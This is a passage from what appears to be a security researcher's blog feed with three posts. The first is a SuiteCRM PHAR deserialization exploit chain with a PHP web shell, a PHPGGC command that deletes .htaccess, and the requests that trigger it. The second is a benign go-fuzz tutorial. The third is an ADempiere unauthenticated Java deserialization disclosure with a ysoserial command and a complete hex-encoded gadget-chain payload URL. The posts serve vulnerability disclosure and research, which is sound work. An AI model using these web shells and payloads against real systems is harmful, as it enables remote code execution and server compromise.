&lt;p&gt;By leveraging file deletion, it is possible to delete application source code files and conduct denial of service attacks. It is also possible to leverage file deletion to execute arbitrary code execution on a SuiteCRM installation by deleting an .htaccess file and accessing uploaded files directly.&lt;/p&gt;

&lt;p&gt;The .htaccess is a distributed configuration file, and is how Apache handles configuration changes on a per directory basis. Within a SuiteCRM installation, this file disallows the direct access to directories such as /upload and /files. PHAR deserialization can be leveraged to delete this file. Furthermore, the mainfest.php mentioned previously can be used to smuggle and trigger PHP code.&lt;/p&gt;

&lt;p&gt;When a module is uploaded within the Module loader functionality, SuiteCRM expects a manifest.php to also be present. An example of this can be seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, SuiteCRM will ensure that the uploaded file must not contain any suspicious function calls such as ‚Äúexec‚Äù or ‚Äúsystem‚Äù. A full list of the blacklisted function calls can be seen here: &lt;a href=&quot;https://support.sugarcrm.com/Documentation/Sugar_Developer/Sugar_Developer_Guide_9.0/Architecture/Module_Loader/Module_Loader_Restrictions/&quot;&gt;Blacklisted Functions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This check does not take into account the ‚Äúinclude‚Äù function. The include function can be used within PHP to include files (local files by default) which are executed as PHP code. So an include function can be smuggled into the manifest file which takes a user parameter (include($_GET[‚Äòp‚Äô]);) , an uploaded file (which are renamed by SuiteCRM) can then be provided which contains malicious PHP code to achieve code execution.&lt;/p&gt;

&lt;h3 id=&quot;phar-deserialization-summary&quot;&gt;PHAR deserialization summary&lt;/h3&gt;

&lt;p&gt;So, to summarize, PHAR deserialization to code execution is as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php echo system($_GET[&quot;cmd&quot;]); ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is renamed to the file eb7cde01-6190-9ca9-b81b-601998504b41 by the application and stored within the /var/www/html/uploads directory. This UID can be seen in the file URL: http://suitecrm.local/index.php?entryPoint=download&amp;amp;id=eb7cde01-6190-9ca9-b81b-601998504b41&amp;amp;type=Documents&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Upload a ZIP PHAR archive which, when triggered, will delete the .htaccess file and has a manifest.php which contains smuggled PHP code.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;PHPGGC can be used as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The following code can then be added to a manifest.php file and then added to the PHAR ZIP archive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This ZIP archive can then be uploaded to the system using the module loader component.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Trigger the Phar Deserialization by calling the maliciousmodule.zip file&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The Backups area can be used to trigger Phar deserialization. The HTTP request send to the application is as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /index.php?module=Administration&amp;amp;action=Backups HTTP/1.1
Host: suitecrm.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: http://suitecrm.local
Connection: close
Referer: http://suitecrm.local/index.php?module=Administration&amp;amp;action=Backups
Cookie: sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;amp;1=10&amp;amp;2=150&amp;amp;3=250&amp;amp;4=175&amp;amp;5=125; PHPSESSID=6b8f472cd174d02167bc0a0c908ec9e0
Upgrade-Insecure-Requests: 1

backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmaliciousmodule.zip&amp;amp;backup_zip=s&amp;amp;run=confirm
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Access the malicousmodule manifest file by browsing to the directory path and include the uploaded shell.php.txt&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Now that the .htaccess file is deleted. The upload directory is accessible. The malcioiusmodule-manifest.php is now accessible as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The ?123 can now be specified and the shell.php.txt file can be provided&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The included shell.php.txt will be interpreted as code, and the cmd parameter can be provided which will be executed by the system command.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;amp;cmd=id
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h3&gt;

&lt;p&gt;To conclude, when validating user input, precautions should be taken to ensure the checks are not case-sensitive. Furthermore, when remediating and preventing the use of Deserialization gadgets, transitive dependencies should be taken into account since they are loaded by a project through Composer‚Äôs autoloading feature. Snyk Open Source also supports PHP scanning and can be used to scan and report on well known libraries that have removed deserialization gadgets in their code.&lt;/p&gt;
</description>
        <pubDate>Sun, 09 May 2021 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web-application-security/2021/05/09/suitecrm-phar-deserialization.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2021/05/09/suitecrm-phar-deserialization.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>Fuzzing with Go-Fuzz</title>
        <description>&lt;p&gt;Fuzzing can often be a very useful technical for finding bugs. Go-fuzz is a coverage-guided fuzzing solution for testing of Go packages. &lt;a href=&quot;https://github.com/dvyukov/go-fuzz&quot;&gt;go-fuzz&lt;/a&gt;. This blog post will walk you through how to use it to find bugs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Installing Go&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;On linux, Go can be quickly installed by the following commands.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /tmp
$ ls
$ curl -OL https://golang.org/dl/go1.15.12.linux-amd64.tar.gz
$ sudo tar -C /usr/local -xvf go1.15.12.linux-amd64.tar.gz
$ go version
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2) &lt;strong&gt;Choosing a target&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Some easy ways to find a target for fuzzing can be&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://pkg.go.dev/&lt;/li&gt;
  &lt;li&gt;https://github.com/trending/go&lt;/li&gt;
  &lt;li&gt;https://github.com/avelino/awesome-go&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For this example, we will fuzz &lt;a href=&quot;https://github.com/JoshVarga/svgparser&quot;&gt;https://github.com/JoshVarga/svgparser&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) &lt;strong&gt;Building pdf package for fuzzing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Go-fuzz can be installed by running the following commands&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go get -u github.com/dvyukov/go-fuzz/go-fuzz
go get -u github.com/dvyukov/go-fuzz/go-fuzz-build
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This installs the latest version of go-fuzz onto your go path&lt;/p&gt;

&lt;p&gt;The svg target we are fuzzing can be installed by &lt;code class=&quot;highlighter-rouge&quot;&gt;go get -u github.com/JoshVarga/svgparser&lt;/code&gt; which will install the svg reader onto your go path as well.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/snoopy/gowork/src/github.com/JoshVarga/svgparser
‚ùØ ls
Óò¶ example_test.go  Óò¶ find.go  Óò¶ find_test.go  Óò¶ fuzz.go  ÔÄñ LICENSE  Óò¶ parser.go  Óò¶ parser_test.go  Ôíä README.md  Óò¶ testutils_test.go  ÔÑï utils
‚ùØ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This will install the svg package we are fuzzing in our go path, you can now go to this directory and create a new file call &lt;code class=&quot;highlighter-rouge&quot;&gt;fuzz.go&lt;/code&gt; which will contain your harness.&lt;/p&gt;

&lt;p&gt;Within Svgparser, we will try to fuzz the &lt;code class=&quot;highlighter-rouge&quot;&gt;Parse&lt;/code&gt; function&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/gofuzz/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121&quot;&gt;https://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To fuzz this function, we can create a fuzz function harness for go-fuzz with the same package name. (Note: your fuzz.go file should be on the same folder as the function you are fuzzing). This function must return 1 if the fuzzer should increase priority of the given input during subsequent fuzzing (for example, the input is lexically correct and was parsed successfully); -1 if the input must not be added to corpus even if gives new coverage; and 0 otherwise; other values are reserved for future use. The Fuzz function must be in a package that go-fuzz can import. This means the code you want to test can‚Äôt be in package main. Fuzzing internal packages are also supported.&lt;/p&gt;

&lt;p&gt;An examples fuzz function for fuzzing can be seen below (which is saved within &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/snoopy/gowork/src/github.com/JoshVarga/svgparser&lt;/code&gt;)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package svgparser

import (
	&quot;bytes&quot;
)

func Fuzz(data []byte) int {

	element,err := Parse(bytes.NewReader(data), false)
	if err != nil {
		if element != nil {
			panic(&quot;svg != nil on error&quot;)
		}
		return 0
	}

	return 1

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This implements &lt;code class=&quot;highlighter-rouge&quot;&gt;Fuzz(data []byte)&lt;/code&gt; function, which is an API expected by go-fuzz. once this has been done, you can go back to your working directory and use &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz-build&lt;/code&gt; to build the archive which &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz&lt;/code&gt; will use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚ùØ pwd
/home/snoopy/svg_fuzz
‚ùØ go-fuzz-build github.com/JoshVarga/svgparser
 ‚úó ls
 Ôêê svgparser-fuzz.zip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which will produce svgparser-fuzz.zip archive.&lt;/p&gt;

&lt;p&gt;3) &lt;strong&gt;Building a corpus&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The next step is to build a corpus for gofuzz to use which will be placed within your working directory. Ideally, files in the corpus are as small as possible and as diverse as possible. You can use inputs used by unit tests, examples and/or generate them manually. Go-fuzz by default will deduplicate and minimize the inputs&lt;/p&gt;

&lt;p&gt;Go-fuzz will also add own inputs to the corpus directory. Furthermore, the go-fuzz-corpus repository contains a bunch of examples of test functions and initial input corpuses for various packages. &lt;a href=&quot;https://github.com/dvyukov/go-fuzz-corpus&quot;&gt;https://github.com/dvyukov/go-fuzz-corpus&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this instance, example svg files can be taken from &lt;a href=&quot;https://github.com/strongcourage/fuzzing-corpus&quot;&gt;https://github.com/strongcourage/fuzzing-corpus&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another option would be to create an example svg file and use &lt;a href=&quot;https://gitlab.com/akihe/radamsa&quot;&gt;radamsa&lt;/a&gt; to mutate the files to create some examples. Gofuzz will also mutate the files given and create more files for your corpus&lt;/p&gt;

&lt;p&gt;These files can be taken and copied to a folder called corpus within you fuzzing directory.&lt;/p&gt;

&lt;p&gt;3) &lt;strong&gt;Fuzzing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;going back to your working directory, you can now start gofuzz: &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz -bin=svgparser-fuzz.zip -workdir=.&lt;/code&gt; The working directory here should contain a folder corpus with all the svg files your previous found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/gofuzz/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As long as you don‚Äôt delete working directory, you can stop and re-start go-fuzz and it will restart where it stopped. Found crashes will be logged in crashers directory.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;*workers means number of tests running in parallel (set with -procs flag).&lt;/li&gt;
  &lt;li&gt;corpus is current number of interesting inputs the fuzzer has discovered, time in brackets says when the last interesting input was discovered&lt;/li&gt;
  &lt;li&gt;crashers is number of discovered bugs (check out workdir/crashers dir).&lt;/li&gt;
  &lt;li&gt;restarts is the rate with which the fuzzer restarts test processes.&lt;/li&gt;
  &lt;li&gt;cover is number of bits set in a hashed coverage bitmap&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;4) &lt;strong&gt;Triaging Crashes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;For any unique crashes, these will be logged within your &lt;code class=&quot;highlighter-rouge&quot;&gt;crashers&lt;/code&gt; directory.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚ùØ cd crashers/
‚ùØ ls
ÔÄñ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7         ÔÄñ 4465097c05a30de5b06942b3f02e4e196276ae49         ÔÄñ 88ffb7f7327afe041ac722aaccc9b248b1a12524         ÔÄñ c5f797d236f6199102cc91083335469aac76cece
ÔÄñ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output  ÔÄñ 4465097c05a30de5b06942b3f02e4e196276ae49.output  ÔÄñ 88ffb7f7327afe041ac722aaccc9b248b1a12524.output  ÔÄñ c5f797d236f6199102cc91083335469aac76cece.output
ÔÄñ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;These will be the format, fuzz input which is the input used to fuzz the file, the .quoted file contains the input quoted as a string and the .output file contains the crash dump&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚ùØ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7
&amp;lt;svg xmlns=&quot;htt00000000000000000000000&quot;&amp;gt;00&amp;lt;/svg&amp;gt;0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚ùØ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted 
	&quot;&amp;lt;svg xmlns=\&quot;htt00000&quot; +
	&quot;000000000000000000\&quot;&amp;gt;&quot; +
	&quot;00&amp;lt;/svg&amp;gt;0&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚ùØ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output 
SVG width: panic: runtime error: index out of range [0] with length 0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This can then be triaged by creating a small program with the input, and using a go debugger to see the stack properly and what part of the code is crashing.&lt;/p&gt;

&lt;p&gt;Another option is also to use libfuzzer&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go-fuzz-build -libfuzzer -o svg.a .
go-fuzz-build -libfuzzer -o svg.a .
clang -fsanitize=fuzzer svg.a -o fuzz_svg
./fuzz_svg corpus_folder
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;further-reading&quot;&gt;Further Reading&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://parsiya.net/blog/2018-04-29-learning-go-fuzz-1-iprange/&quot;&gt;Learning Go-Fuzz 1: iprange&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://parsiya.net/blog/2018-05-05-learning-go-fuzz-2-goexif2/&quot;&gt;Learning Go-Fuzz 2: goexif2&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://mijailovic.net/2017/07/29/go-fuzz/&quot;&gt;Going down the rabbit hole with go-fuzz&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=pA4E8rvQGmY&quot;&gt;Introduction to Go fuzzing: fuzz your first project in a few minutes&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 03 May 2021 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/software-security/2021/05/03/fuzzing-wit-go-fuzz.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/software-security/2021/05/03/fuzzing-wit-go-fuzz.html</guid>
        
        
        <category>software-security</category>
        
      </item>
    
      <item>
        <title>ADempiere Unsafe Deserialization to Code Execution</title>
        <description>&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service&lt;/p&gt;

&lt;p&gt;Java serialization turns object graphs into byte streams containing the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they may even replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed.&lt;/p&gt;

&lt;p&gt;Adempiere is vulnerable to unauthenticated Java Deserialization which can result in code execution.&lt;/p&gt;

&lt;h3 id=&quot;technical-details---analysis&quot;&gt;Technical Details - Analysis&lt;/h3&gt;

&lt;p&gt;Within Adempiere, an unauthenticated deserialization vulnerability exists within &lt;code class=&quot;highlighter-rouge&quot;&gt;MIssue.java&lt;/code&gt;. The create method within MIssue.java is used to create and report issue, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;Java.io.ObjectInputStream.readObject()&lt;/code&gt; method is used to achieve this without any validation or whitelisting of classes from the datastream.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This method is used by &lt;code class=&quot;highlighter-rouge&quot;&gt;IssueReportServlet&lt;/code&gt; which takes a user parameter called ISSUE can contain serialized data within ASCII hex encoding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code class=&quot;highlighter-rouge&quot;&gt;issuestring&lt;/code&gt; data is then sent to the create method for deserialization.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;technical-details---exploitation&quot;&gt;Technical Details - Exploitation&lt;/h3&gt;

&lt;p&gt;This can be leveraged by an attacker for code execution through unsafe deserialization. The following libraries are used by Adempire for various tasks within the project, and as such are availiable within the Java runtime‚Äôs classpath.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ysoserial is used to speed up the exploitation process and generate a gadget chain that can be used to execute arbritary code on a machine using Adempire. &lt;code class=&quot;highlighter-rouge&quot;&gt;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/test.txt&quot; | xxd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This serialized object can now be sent as a parameter to the application to create a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; under the &lt;code class=&quot;highlighter-rouge&quot;&gt;tmp&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://target.local:4447/wstore/issueReportServlet?ISSUE=aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e00200007870000006a7cafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e010013746f756368202f746d702f746573742e74787408003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001d79736f73657269616c2f50776e6572333333303639363733373339363601001f4c79736f73657269616c2f50776e657233333330363936373337333936363b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002f000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000034000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000038000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e0010000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003c000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e72707701007871007e000d78
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The created file can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Multiple other vulnerabilities also exist within ADempierie.&lt;/p&gt;

&lt;h3 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h3&gt;

&lt;p&gt;It is possible to inject malicious JavaScript into the name parameter of a user profile.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/xss1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will stored within the application, and is returned back within the &lt;code class=&quot;highlighter-rouge&quot;&gt;wstore&lt;/code&gt; java servlet. An example of this can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/xss2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;command-injection-windows-only&quot;&gt;Command Injection (Windows Only)&lt;/h3&gt;

&lt;p&gt;A command injection vulnerability exists when attachments are opened with a malicious filename under the windows environment.&lt;/p&gt;

&lt;p&gt;The&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/cmdi1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The filename parameter being concatenated can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/adempiere/cmdi2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 14 Apr 2021 10:00:00 +0100</pubDate>
